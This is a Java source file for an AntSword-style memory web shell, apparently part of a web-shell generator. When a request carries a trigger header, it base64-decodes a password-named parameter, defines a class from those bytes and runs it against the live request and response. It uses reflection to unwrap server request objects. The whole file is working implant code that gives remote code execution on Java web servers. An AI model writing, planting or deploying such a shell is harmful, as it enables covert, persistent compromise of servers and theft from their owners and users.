package com.reajason.javaweb.memshell.shelltool.antsword;

import java.lang.reflect.Field;

/**
 * @author ReaJason
 */
public class AntSword extends ClassLoader {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public AntSword() {
    }

    public AntSword(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrapRequest(args[0]);
        Object response = unwrapResponse(args[1]);
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] bytes = base64Decode(parameter);
                Object instance = (new AntSword(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(new Object[]{request, response});
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    public Object unwrapRequest(Object request) {
        Object internalRequest = request;
        while (true) {
            try {
                Object r = getFieldValue(request, "request");
                if (r == internalRequest) {
                    return r;
                } else {
                    internalRequest = r;
                }
            } catch (Exception e) {
                return internalRequest;
            }
        }
    }

    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}